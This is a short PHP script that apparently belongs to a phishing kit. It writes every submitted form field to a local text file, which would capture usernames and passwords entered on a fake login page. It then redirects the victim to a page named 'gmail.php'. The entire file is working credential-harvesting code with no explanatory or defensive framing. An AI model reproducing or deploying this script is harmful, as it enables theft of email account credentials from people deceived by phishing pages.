 <?php

// pinnocent
header
('location:');
$handle=fopen("idz.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:gmail.php");
exit;
// pinnocent
?>
